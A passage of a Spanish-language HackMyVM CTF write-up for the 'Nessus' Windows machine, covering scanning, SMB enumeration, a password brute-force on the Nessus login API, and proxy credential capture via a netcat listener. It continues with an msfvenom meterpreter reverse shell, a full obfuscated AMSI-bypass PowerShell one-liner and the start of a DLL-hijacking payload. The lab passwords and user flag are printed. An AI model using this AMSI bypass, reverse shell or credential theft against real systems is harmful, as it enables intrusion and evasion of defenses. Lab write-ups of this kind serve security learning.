---
icon: flag
---

# Nessus HackMyVM (Easy - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 06:49 EDT
Nmap scan report for 192.168.1.164
Host is up (0.00053s latency).

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8834/tcp  open  ssl/nessus-xmlrpc?
| ssl-cert: Subject: commonName=WIN-C05BOCC7F0H/organizationName=Nessus Users United/stateOrProvinceName=NY/countryName=US
| Not valid before: 2024-10-18T17:36:17
|_Not valid after:  2028-10-17T17:36:17
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Cache-Control: must-revalidate
|     X-Frame-Options: DENY
|     Content-Type: text/html
|     ETag: 27393d29a7ce578108e0989bb8e5b05c
|     Connection: close
|     X-XSS-Protection: 1; mode=block
|     Server: NessusWWW
|     Date: Mon, 31 Mar 2025 10:50:02 GMT
|     X-Content-Type-Options: nosniff
|     Content-Length: 1217
|     Content-Security-Policy: upgrade-insecure-requests; block-all-mixed-content; form-action 'self'; frame-ancestors 'none'; frame-src 
https://store.tenable.com; default-src 'self'; connect-src 'self' www.tenable.com; script-src 'self' www.tenable.com; img-src 'self' data:; style-src 'self' 
www.tenable.com; object-src 'none'; base-uri 'self';
|     Strict-Transport-Security: max-age=31536000
|     Expect-CT: max-age=0
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
|_    <meta http-equiv="Content-Security-Policy" content="upgrade-inse
|_ssl-date: TLS randomness does not represent time
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc              Microsoft Windows RPC
49665/tcp open  msrpc              Microsoft Windows RPC
49666/tcp open  msrpc              Microsoft Windows RPC
49667/tcp open  msrpc              Microsoft Windows RPC
49668/tcp open  msrpc              Microsoft Windows RPC
49671/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at 
https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8834-TCP:V=7.94SVN%T=SSL%I=7%D=3/31%Time=67EA7355%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,788,"HTTP/1\.1\x20200\x20OK\r\nCache-Control:\x20must
SF:-revalidate\r\nX-Frame-Options:\x20DENY\r\nContent-Type:\x20text/html\r
SF:\nETag:\x2027393d29a7ce578108e0989bb8e5b05c\r\nConnection:\x20close\r\n
SF:X-XSS-Protection:\x201;\x20mode=block\r\nServer:\x20NessusWWW\r\nDate:\
SF:x20Mon,\x2031\x20Mar\x202025\x2010:50:02\x20GMT\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nContent-Length:\x201217\r\nContent-Security-Policy:\x
SF:20upgrade-insecure-requests;\x20block-all-mixed-content;\x20form-action
SF:\x20'self';\x20frame-ancestors\x20'none';\x20frame-src\x20https://store
SF:\.tenable\.com;\x20default-src\x20'self';\x20connect-src\x20'self'\x20w
SF:ww\.tenable\.com;\x20script-src\x20'self'\x20www\.tenable\.com;\x20img-
SF:src\x20'self'\x20data:;\x20style-src\x20'self'\x20www\.tenable\.com;\x2
SF:0object-src\x20'none';\x20base-uri\x20'self';\r\nStrict-Transport-Secur
SF:ity:\x20max-age=31536000\r\nExpect-CT:\x20max-age=0\r\n\r\n<!doctype\x2
SF:0html>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE
SF:=edge,chrome=1\"\x20/>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-e
SF:quiv=\"Content-Security-Policy\"\x20content=\"upgrade-inse");
MAC Address: 08:00:27:40:50:34 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-31T10:51:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 5s
|_nbstat: NetBIOS name: NESSUS, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:40:50:34 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.77 seconds
```

Vemos lo que parece ser una pagina web en el puerto `8834` pero que va con `SSL` por lo que se tiene que utilizar `HTTPS` para entrar, tambien vemos el puerto de `WinRM` que nos podra servir para conectarnos de forma remota con algun usuario y veremos tambien interesante el servidor `SMB` el cual podremos ver que recursos compartidos hay, vamos a empezar entrando en la pagina web.

Si entramos de la siguiente forma:

```
URL = https://<IP>:8834/
```

Veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que es el `Software` de `Nessus` por lo que no podremos hace mucho en esta parte de la pagina web, vamos a ver si se pudiera realizar un escaneo al servidor `SMB` de forma anonima.

## SMB

```shell
smbclient -L //<IP>/ -N
```

Info:

```
		Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Documents       Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.1.164 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Vemos que funciono y veremos un recurso compartido que no viene por defecto llamado `Documents`, vamos a probar a entrar en el.

```shell
smbclient //<IP>/Documents
```

Veremos que funciona, por lo que vamos a listarlo a ver que nos encontramos.

```
  .                                  DR        0  Fri Oct 18 20:42:53 2024
  ..                                  D        0  Sat Oct 19 01:08:23 2024
  desktop.ini                       AHS      402  Sat Jun 15 13:54:33 2024
  My Basic Network Scan_hwhm7q.pdf      A   122006  Fri Oct 18 18:19:59 2024
  My Music                        DHSrn        0  Sat Jun 15 13:54:27 2024
  My Pictures                     DHSrn        0  Sat Jun 15 13:54:27 2024
  My Videos                       DHSrn        0  Sat Jun 15 13:54:27 2024
  Web Application Tests_f6jg9t.pdf      A   136025  Fri Oct 18 18:20:14 2024

                12942591 blocks of size 4096. 10817065 blocks available
```

Nos vamos a descargar los dos `PDFs`:

```shell
get "My Basic Network Scan_hwhm7q.pdf"
get "Web Application Tests_f6jg9t.pdf"
```

Una vez pasados los `PDFs` si los abrimos veremos un reporte de `Nessus` pero que no veremos gran cosa o nada interesante, vamos a sacar los `metadatos` de dichos `PDFs` para ver si vemos algo.

### Metadatos

```shell
exiftool My\ Basic\ Network\ Scan_hwhm7q.pdf
```

Info:

```
ExifTool Version Number         : 13.00
File Name                       : My Basic Network Scan_hwhm7q.pdf
Directory                       : .
File Size                       : 122 kB
File Modification Date/Time     : 2025:03:31 06:56:52-04:00
File Access Date/Time           : 2025:03:31 06:56:52-04:00
File Inode Change Date/Time     : 2025:03:31 06:56:52-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
Linearized                      : No
Page Count                      : 5
Profile CMM Type                : Little CMS
Profile Version                 : 2.3.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2004:08:13 12:18:06
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Little CMS
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 7fb30d688bf82d32a0e748daf3dba95d
Device Mfg Desc                 : lcms generated
Profile Description             : sRGB
Device Model Desc               : sRGB
Media White Point               : 0.95015 1 1.08826
Red Matrix Column               : 0.43585 0.22238 0.01392
Blue Matrix Column              : 0.14302 0.06059 0.71384
Green Matrix Column             : 0.38533 0.71704 0.09714
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown
Chromaticity Channel 1          : 0.64 0.33
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.14999 0.06
Profile Copyright               : no copyright, use freely
XMP Toolkit                     : Image::ExifTool 12.76
Date                            : 2024:10:18 15:10:05+02:00
Format                          : application/pdf
Language                        : x-unknown
Author                          : Jose
PDF Version                     : 1.4
Producer                        : Apache FOP Version 2.8
Create Date                     : 2024:10:18 15:10:05+02:00
Creator Tool                    : Apache FOP Version 2.8
Metadata Date                   : 2024:10:18 15:10:05+02:00
Page Mode                       : UseOutlines
Creator                         : Apache FOP Version 2.8
```

Entre los `2` `PDFs` veremos que hay una opcion `Author` en la cual pone `Jose` por lo que podemos deducir que puede ser un nombre de usuario.

Vamos a probar a meter las credenciales probando la contraseña con el propio nombre de usuario en `Nessus` (`jose:jose`) pero veremos que son invalidas, por lo que vamos a realizar un poco de fuerza bruta por si pudieramos encontrar la contraseña de la posible cuenta de `jose` en `Nessus`.

## FFUF

Si nosotros capturamos la peticion con `BurpSuite` al autenticarnos con cualquier credencial, para ver como se esta haciendo por detras, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que se esta enviando a una `API` de `Nessus` con el parametro `session` y en la peticion veremos lo siguiente:

```
POST /session HTTP/1.1
Host: 192.168.1.164:8834
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Api-Token: 3d27a65d-e7eb-40a0-8931-1d086d046d29
Content-Length: 37
Origin: https://192.168.1.164:8834
Referer: https://192.168.1.164:8834/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"username":"jose","password":"jose"}
```

Vemos que se esta realizando con dicha estructura, por lo que vamos a formar un comando con `FFUF` para realizar fuerza bruta con el usuario `jose` de la siguiente forma:

```shell
ffuf -u https://<IP>:8834/session -X POST -H "Content-Type: application/json" -d '{"username":"jose","password":"FUZZ"}' -w <WORDLIST> -mc 200
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://192.168.1.164:8834/session
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"username":"jose","password":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

tequiero                [Status: 200, Size: 179, Words: 1, Lines: 1, Duration: 1124ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Por lo que vemos hemos obtenido las credenciales de dicho usuario, vamos a probarlas en `Nessus`

```
User: jose
Pass: tequiero
```

Vemos que si nos podemos loguear en `Nessus` y veremos que estamos dentro con la cuenta de `jose` en `Nessus`, pero si nos vamos a la siguiente ruta `settings` -> `proxy-server`.

```
URL = https://<IP>:8834/#/settings/proxy-server
```

Y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un usuario que se llama `nesus`, por lo que podemos deducir que puede ser un usuario del sistema en la maquina `Windows`.

Vamos a realizar la prueba de `Test Proxy Server` cambiando la configuracion a nuestros requisitos como por ejemplo la `IP` y el `Auth Method` en `BASIC` pero antes de darle al boton, vamos a ponernos a la escucha de la siguiente forma:

## Escalate user nesus

```shell
nc -lvnp 8080
```

Ahora le daremos al boton y veremos lo siguiente:

```
listening on [any] 8080 ...
connect to [192.168.1.146] from (UNKNOWN) [192.168.1.164] 49793
CONNECT plugins.nessus.org:443 HTTP/1.1
Proxy-Authorization: Basic bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==
Host: plugins.nessus.org
Connection: keep-Alive
User-Agent: Nessus/10.7.3
Content-Length: 0
Proxy-Connection: Keep-Alive
```

Vemos que nos envia la contraseña de `nessus` en `Base64`, si lo decodificamos veremos lo siguiente:

```shell
echo 'bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==' | base64 -d
```

Info:

```
nesus:Z#JuXH$ph-;v@,X&mV)
```

Ahora vamos a probar dichas credenciales para el servidor `SMB`:

```shell
netexec smb <IP> -u nesus -p 'Z#JuXH$ph-;v@,X&mV)' --ignore-pw-decoding
```

Info:

```
SMB         192.168.1.164   445    NESSUS           [*] Windows Server 2022 Build 20348 x64 (name:NESSUS) (domain:Nessus) (signing:False) (SMBv1:False)
SMB         192.168.1.164   445    NESSUS           [-] Nessus\nesus:Z#JuXH$ph-;v@,X&mV) STATUS_PASSWORD_EXPIRED
```

Vemos que nos dice que si funciona, pero que ha expirado, por lo que esto es un fallo de la maquina, tendremos que cambiarlo de forma manual para actualizar la contraseña a la misma, haremos lo siguiente:

Nos vamos a la maquina `Windows` y le damos al siguiente boton:

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Con esto desbloqueamos la maquina `Windows` y le damos varias veces al `ESC` para llegar a esta parte:

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Pulsaremos en el usuario `nesus` y le daremos a `password` para meter la contraseña que expiro, el teclado esta en `ingles` por lo que tendremos que pulsar las teclas como si fuera teclado ingles es importante.

Una vez metido las credenciales correctas, nos pondra que expiro y que pongamos la nueva contraseña, por lo que repetiremos la misma contarseña y ya se cambiaria de forma correcta, ahora si probamos de nuevo veremos lo siguiente:

```
SMB         192.168.1.164   445    NESSUS           [*] Windows Server 2022 Build 20348 x64 (name:NESSUS) (domain:Nessus) (signing:False) (SMBv1:False)
SMB         192.168.1.164   445    NESSUS           [+] Nessus\nesus:Z#JuXH$ph-;v@,X&mV)
```

### evil-winrm

Ahora probaremos en `WinRM` a ver si funciona:

```shell
evil-winrm -i <IP> -u nesus -p 'Z#JuXH$ph-;v@,X&mV)'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nesus\Documents> whoami
nessus\nesus
```

Veremos que ha funcionado y ya estaremos dentro de dicha maquina `Windows` mediante `WinRM`, por lo que leeremos la flag del usuario.

> user.txt

```
72113f41d43e88eb5d67f732668bc3d1
```

## Escalate Privileges

Si vemos que privilegios, grupos, etc... Tenemos veremos lo siguiente:

```powershell
whoami /all
```

Info:

```
USER INFORMATION
----------------

User Name    SID
============ ============================================
nessus\nesus S-1-5-21-2986980474-46765180-2505414164-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Vamos a obtener una `shell` mediante `metasploit` con `meterpreter`.

### Reverse Shell Metasploit

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f psh-reflection > shell.ps1
```

Ahora vamos abrir un servidor de `python3`:

```shell
python3 -m http.server 8000
```

En la maquina victima ejecutaremos lo siguiente:

```powershell
cd C:\Users\nesus\Downloads
Invoke-WebRequest -Uri "http://<IP>:8000/shell.ps1" -OutFile "C:\Users\nesus\Downloads\shell.ps1"
```

Ahora vamos a `bypassear` el modulo `AMSI` del `Windows Defender` con el siguiente codigo:

URL = [Bypass Modulo AMSI Pagina](https://d1se0.github.io/AMSI-Bypass-Generator/index.html)

```powershell
$JmRIgg7pbjB=$null;$J5xhHEldAdGmGsdjV=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+6814-6814));$kdiojlldvsqhsvfjwl="+[ChAr](104+62-62)+[cHAR]([bYte]0x75)";[Threading.Thread]::Sleep(457);[Ref].Assembly.GetType("System.$([CHAr]([byTE]0x4d)+[chAr](24+73)+[cHAr](44+66)+[Char](97+66-66)+[chaR]([BYte]0x67)+[CHAR]([bYtE]0x65)+[cHAr](109+62-62)+[cHaR]([BYTe]0x65)+[cHaR]([ByTe]0x6e)+[cHar]([bYtE]0x74)).$([chaR]([bYTe]0x41)+[CHAR]([BYTe]0x75)+[CHar](116)+[chAr]([BYTE]0x6f)+[CHaR](78+31)+[chAr]([byTE]0x61)+[CHar]([Byte]0x74)+[char](6+99)+[Char](111)+[Char](110*74/74)).$([CHaR]([byte]0x41)+[char](5+104)+[ChaR]([bytE]0x73)+[chAR](105*63/63)+[cHaR](85*29/29)+[CHAR](80+36)+[CHaR](52+53)+[chAR]([BYTe]0x6c)+[ChaR](115*74/74))").GetField("$([ChaR]([bYTe]0x61)+[CHAR](109*65/65)+[Char]([byte]0x73)+[ChaR](105)+[cHar]([bYte]0x53)+[cHar]([byTE]0x65)+[ChaR](115*4/4)+[chaR](115+11-11)+[chAR](105*5/5)+[chAr](111*9/9)+[char]([byte]0x6e))", "NonPublic,Static").SetValue($JmRIgg7pbjB, $JmRIgg7pbjB);[Ref].Assembly.GetType("System.$([CHAr]([byTE]0x4d)+[chAr](24+73)+[cHAr](44+66)+[Char](97+66-66)+[chaR]([BYte]0x67)+[CHAR]([bYtE]0x65)+[cHAr](109+62-62)+[cHaR]([BYTe]0x65)+[cHaR]([ByTe]0x6e)+[cHar]([bYtE]0x74)).$([chaR]([bYTe]0x41)+[CHAR]([BYTe]0x75)+[CHar](116)+[chAr]([BYTE]0x6f)+[CHaR](78+31)+[chAr]([byTE]0x61)+[CHar]([Byte]0x74)+[char](6+99)+[Char](111)+[Char](110*74/74)).$([CHaR]([byte]0x41)+[char](5+104)+[ChaR]([bytE]0x73)+[chAR](105*63/63)+[cHaR](85*29/29)+[CHAR](80+36)+[CHaR](52+53)+[chAR]([BYTe]0x6c)+[ChaR](115*74/74))").GetField("$([CHAr]([BytE]0x61)+[cHar]([BytE]0x6d)+[cHaR]([BYte]0x73)+[cHaR](105)+[cHaR](67+51-51)+[cHaR](111+56-56)+[cHar]([bytE]0x6e)+[cHar]([byTe]0x74)+[ChAR](101*11/11)+[char]([bytE]0x78)+[cHar]([bYte]0x74))", "NonPublic,Static").SetValue($JmRIgg7pbjB, [IntPtr]$J5xhHEldAdGmGsdjV);$ilpowzzhhv="+('cmmîqxácìqmjzvkècmswìf'+'st').NORmaLIzE([cHar](70)+[char](111)+[cHaR](114*77/77)+[char](109+12-12)+[Char](68*1/1)) -replace [CHAR]([ByTE]0x5c)+[chaR]([ByTe]0x70)+[char]([bYTe]0x7b)+[cHAR]([ByTe]0x4d)+[cHaR]([ByTe]0x6e)+[CHAr]([bYtE]0x7d)";[Threading.Thread]::Sleep(1044)
```

Antes de ejecutar la `shell.ps1` vamos a ponernos a la escucha:

```shell
msfconsole -q
```

Vemos a utilizar el modulo de esucha:

```shell
use multi/handler
```

Ahora vamos a configurarlo de la siguiente forma:

```shell
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP_ATTACKER>
set LPORT <PORT>
run
```

Ahora si podremos ejecutar el script de la `reverse shell` en la maquina victima.

```shell
.\shell.ps1
```

Ahora si volvemos a donde tenemos la escucha veremos lo siguiente:

```
[*] Started reverse TCP handler on 192.168.1.146:7777 
[*] Sending stage (203846 bytes) to 192.168.1.164
[*] Meterpreter session 2 opened (192.168.1.146:7777 -> 192.168.1.164:49730) at 2025-04-01 06:19:34 -0400

meterpreter > getuid
Server username: NESSUS\nesus
```

Vemos que ha funcionado, por lo que vamos a dejar en segundo plano la sesion de la `shell` haciendo `Ctrl+Z` y dandole a `Y`.

Una vez echo esto, vamos a utilizar un modulo de `metasploit` para enumerar las diferentes vulnerabilidades a nivel local de la maquina victima `Windows`.

```shell
use post/multi/recon/local_exploit_suggester
```

Vamos a configurar el modulo de la siguiente forma:

```shell
set SESSION <ID_SESSION>
set SHOWDESCRIPTION true
exploit
```

Info:

```
[*] 192.168.1.164 - Collecting local exploits for x64/windows...
[*] 192.168.1.164 - 198 exploit checks are being tried...
[+] 192.168.1.164 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
  Microsoft Windows allows for the automatic loading of a profiling 
  COM object during the launch of a CLR process based on certain 
  environment variables ostensibly to monitor execution. In this case, 
  we abuse the profiler by pointing to a payload DLL that will be 
  launched as the profiling thread. This thread will run at the 
  permission level of the calling process, so an auto-elevating 
  process will launch the DLL with elevated permissions. In this case, 
  we use gpedit.msc as the auto-elevated CLR process, but others would 
  work, too.
[+] 192.168.1.164 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
  This module will bypass Windows UAC by hijacking a special key in 
  the Registry under the current user hive, and inserting a custom 
  command that will get invoked when Window backup and restore is 
  launched. It will spawn a second shell that has the UAC flag turned 
  off. This module modifies a registry key, but cleans up the key once 
  the payload has been invoked.
[+] 192.168.1.164 - exploit/windows/local/cve_2022_21882_win32k: The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2016+ Build 20348
  A vulnerability exists within win32k that can be leveraged by an 
  attacker to escalate privileges to those of NT AUTHORITY\SYSTEM. The 
  flaw exists in how the WndExtra field of a window can be manipulated 
  into being treated as an offset despite being populated by an 
  attacker-controlled value. This can be leveraged to achieve an out 
  of bounds write operation, eventually leading to privilege 
  escalation. This flaw was originally identified as CVE-2021-1732 and 
  was patched by Microsoft on February 9th, 2021. In early 2022, a 
  technique to bypass the patch was identified and assigned 
  CVE-2022-21882. The root cause is is the same for both 
  vulnerabilities. This exploit combines the patch bypass with the 
  original exploit to function on a wider range of Windows 10 targets.
[+] 192.168.1.164 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
  The Windows Print Spooler has a privilege escalation vulnerability 
  that can be leveraged to achieve code execution as SYSTEM. The 
  `SpoolDirectory`, a configuration setting that holds the path that a 
  printer's spooled jobs are sent to, is writable for all users, and 
  it can be configured via `SetPrinterDataEx()` provided the caller 
  has the `PRINTER_ACCESS_ADMINISTER` permission. If the 
  `SpoolDirectory` path does not exist, it will be created once the 
  print spooler reinitializes. Calling `SetPrinterDataEx()` with the 
  `CopyFiles\` registry key will load the dll passed in as the `pData` 
  argument, meaning that writing a dll to the `SpoolDirectory` 
  location can be loaded by the print spooler. Using a directory 
  junction and UNC path for the `SpoolDirectory`, the exploit writes a 
  payload to `C:\Windows\System32\spool\drivers\x64\4` and loads it by 
  calling `SetPrinterDataEx()`, resulting in code execution as SYSTEM.
[+] 192.168.1.164 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
  A privilege escalation vulnerability exists in the clfs.sys driver 
  which comes installed by default on Windows 10 21H2, Windows 11 21H2 
  and Windows Server 20348 operating systems. The clfs.sys driver 
  contains a function CreateLogFile that is used to create open and 
  edit '*.blf' (base log format) files. Inside a .blf file there are 
  multiple blocks of data which contain checksums to verify the 
  integrity of the .blf file and to ensure the file looks and acts 
  like a .blf file. However, these files can be edited with 
  CreateFileA or with fopen and then modified with WriteFile or fwrite 
  respectively in order to change the contents of the file and update 
  their checksums accordingly. This exploit makes use to two different 
  kinds of specially crafted .blf files that are edited using the 
  technique mentioned above. There are multiple spray .blf files. The 
  spray .blf files are specially crafted to initiate an out of bounds 
  read which reads from a contiguous block of memory. The block of 
  memory it reads from contains a read-write pipe that points to the 
  address of the second type of .blf file - the trigger .blf file. The 
  trigger .blf file is specially crafted read the SYSTEM token and 
  write it in the process of the exploit to achieve the local 
  privilege escalation. The exploits creates a controlled memory space 
  by first looping over the CreatePipe function to to create thousands 
  of read-write pipes (which take up 0x90 bytes of memory). It then 
  releases a certain number of pipes from memory and calls 
  CreateLogFile to open the pre-existing spray .blf files which when 
  being opened fill the 0x90 byte gaps created by the deallocation of 
  the pipes in memory, creating the controlled memory space. This is a 
  very brief and high overview description of what the exploit is 
  actually doing. For a more detailed and in depth analysis please 
  refer to the following 
  [reference](https://github.com/fortra/CVE-2023-28252).
[+] 192.168.1.164 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2016+ Build 20348
  CVE-2024-30088 is a Windows Kernel Elevation of Privilege 
  Vulnerability which affects many recent versions of Windows 10, 
  Windows 11 and Windows Server 2022. The vulnerability exists inside 
  the function called `AuthzBasepCopyoutInternalSecurityAttributes` 
  specifically when the kernel copies the 
  `_AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION` of the current token 
  object to user mode. When the kernel preforms the copy of the 
  `SecurityAttributesList`, it sets up the list of the 
  SecurityAttribute's structure directly to the user supplied pointed. 
  It then calls `RtlCopyUnicodeString` and 
  `AuthzBasepCopyoutInternalSecurityAttributeValues` to copy out the 
  names and values of the `SecurityAttribute` leading to multiple Time 
  Of Check Time Of Use (TOCTOU) vulnerabilities in the function.
[*] Running check method for exploit 47 / 47
[*] 192.168.1.164 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2016+ Build 20348                                                                                            
 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default                                                                     
 6   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2016+ Build 20348
```

Pero no veremos nada interesante, ya que no funcionara ninguno, vamos a seguir buscando un poco en la maquina victima.

Pero si hacemos esto:

```powershell
dir "C:\Program Files\Tenable\Nessus\"
```

Info:

```
Directory: C:\Program Files\Tenable\Nessus


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/18/2024  10:35 AM              1 .winperms
-a----          5/9/2024  11:30 PM        2471544 fips.dll
-a----          5/9/2024  11:30 PM        5217912 icudt73.dll
-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll
-a----          5/9/2024  11:30 PM        4988536 legacy.dll
-a----          5/9/2024  11:06 PM         375266 License.rtf
-a----          5/9/2024  11:37 PM       11204728 nasl.exe
-a----          5/9/2024  11:31 PM         264824 ndbg.exe
-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url
-a----          5/9/2024  11:33 PM          38520 nessus-service.exe
-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe
-a----          5/9/2024  11:38 PM       11925624 nessusd.exe
```

Veremos que podemos listar y entrar dentro de la carpeta `Nessus` junto con las `.dll` etc... Llegados a este punto lo que se nos puede ocurrir es realizar un secuestro de `DLL` contra el servicio de `Nessus`.

### DLL Hijacking (Nessus Service)

Vamos a crear un `.dll` que agregara un nuevo usuario como `administrador` en la máquina victima `Windows`.

> malicious.dll

```c
#include <stdlib.h>
#include <windows.h>

// COMPILE
// x86_64-w64-mingw32-gcc adduser.c --shared -o adduser.dll

BOOL APIENTRY DllMain(
  HANDLE hModule,       // Handle to DLL module
  DWORD  ul_reason_for_call, // Reason for calling function
  LPVOID lpReserved)    // Reserved
{
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        // Ejecutar comandos para agregar un nuevo usuario y agregarlo a grupos específicos
